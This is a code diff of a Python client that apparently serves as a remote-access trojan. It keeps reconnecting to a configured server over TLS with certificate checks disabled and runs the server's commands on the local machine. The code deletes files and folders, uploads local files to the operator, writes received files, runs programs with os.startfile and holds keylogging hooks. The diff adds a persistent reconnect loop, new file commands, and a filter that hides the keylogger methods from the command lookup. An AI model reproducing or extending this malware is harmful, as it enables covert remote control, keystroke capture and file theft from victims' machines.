@@ -28,7 +28,7 @@ class App():
         self.context.verify_mode = ssl.CERT_NONE
 
     def run(self):
-        while self.status != "CLOSED":
+        while True:
             try:
                 sock = socket.create_connection((self.hostname, self.port))
                 self.socket = self.context.wrap_socket(sock, server_hostname=self.hostname)
@@ -49,8 +49,20 @@ class App():
                     if data == "GRANTED":
                         print("client selected")
                         self.status = "SELECTED"
+                        self.socket.settimeout(10)
                         while self.status != "CLOSED":
-                            header = self.socket.recv(4096).decode().strip().split(":")
+                            
+                            header = self.socket.recv(4096).decode()
+                            if header == "CLOSE:CLOSE:CLOSE":
+                                data = self.socket.recv(1024).decode()
+                                if data == "CLOSE":
+                                    self.socket.send(b"CLOSED:1024:CLOSED")
+                                    self.socket.send(pickle.dumps("CLOSED"))
+                                    self.status = "CLOSED"
+                                    break
+                                    
+                            header = header.strip().split(":")
+                            
                             type_, size, name = header[0], int(header[1]), header[2]
                             
                             bytes_data = b""
@@ -75,6 +87,7 @@ class App():
 
                 sock.close()
                 self.socket.close()
+                self.status = "IDLE"
                 
             except ConnectionRefusedError:
                 pass
@@ -91,6 +104,7 @@ class App():
             data_in = data_in[0]
         
         if type_ == "COMMAND":
+            data_in = data_in.replace("\\", "/")
             try:
                 
                 if data_in.startswith("schedule"):
@@ -116,6 +130,10 @@ class App():
                 data = str(e)
                 header = "TEXT:ERROR"
                 print(2, e)
+        
+        elif type_ == "PING":
+            header = "PING:"
+        
         else:
             data = "TYPE_NOT_VALID"
         
@@ -145,6 +163,8 @@ class CMD():
         self.keys_log = []
         
     def get_command(self, command_name):
+        if command_name in ["__init__", "get_command", "on_press", "listen_keys"]:
+            return None
         if hasattr(self, command_name):
             return getattr(self, command_name)
         return None
@@ -162,48 +182,58 @@ class CMD():
         else:
             path = os.path.join(os.getcwd(), self.args[0])
             return os.listdir(path), "LIST_DIR"
+        
+    def rename(self):
+        path = os.path.join(os.path.dirname(self.args[0]), self.args[1])
+        os.rename(self.args[0], path)
+        return "Done", "RENAME"
     
     def mkdir(self):
         os.mkdir(self.args[0])
         return "Done", "CREATE_DIR"
     
-    def remove(self):
-        path = os.path.join(os.getcwd(), self.args[0])
+    def makedirs(self):
+        os.makedirs(self.args[0])
+        return "Done", "MAKE_DIRS"
+    
+    def removefile(self):
+        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
         os.remove(path)
         return "Done", "REMOVE_FILE"
     
     def removedir(self):
-        path = os.path.join(os.getcwd(), self.args[0])
+        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
         shutil.rmtree(path)
         return "Done", "REMOVE_DIR"
     
     def ispath(self):
-        path = os.path.join(os.getcwd(), self.args[0])
+        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
         return os.path.exists(path), "IS_PATH"
     
     def isdir(self):
-        path = os.path.join(os.getcwd(), self.args[0])
+        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
         return os.path.isdir(path), "IS_DIR"
     
     def getfile(self):
         with open(self.args[0], "rb") as f:
             data = f.read()
         self.type = "FILE"
-        return data, self.args[0]
+        return data, os.path.basename(self.args[0])
     
     def sendfile(self):
-        with open(f"{os.getcwd()}\{self.args[0]}", "wb") as f:
+        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
+        with open(path, "wb") as f:
             f.write(self.controller.data_)
         return "Done", "SEND_FILE"
     
-    def zip_(self):
-        shutil.make_archive(self.args[0], "zip", os.getcwd())
+    def zip(self):
+        shutil.make_archive(self.args[0], "zip", os.getcwd().replace("\\", "/") if len(self.args) < 2 else self.args[1])
         return "Done", "ZIP"
     
     def unzip(self):
         time_ = time.time()
         os.mkdir(f"unzipped_{time_}")
-        shutil.unpack_archive(self.args[0], f"unzipped_{time_}/")
+        shutil.unpack_archive(self.args[0], f"unzipped_{time_}/" if len(self.args) < 2 else self.args[1])
         return "Done", "UNZIP"
     
     def move(self):
@@ -274,7 +304,7 @@ class CMD():
         os.startfile(path)
         return "Done", "EXECUTE"
     
-    def print_(self):
+    def print(self):
         print(self.args)
         return "Done", "PRINT"
     
@@ -282,7 +312,7 @@ class CMD():
         self.controller.status = "CLOSED"
         return "Done", "CLOSE"
     
-    def help_(self):
+    def help(self):
         return list(self.controller.commands.keys()), "HELP"
     
     def on_press(self, key):
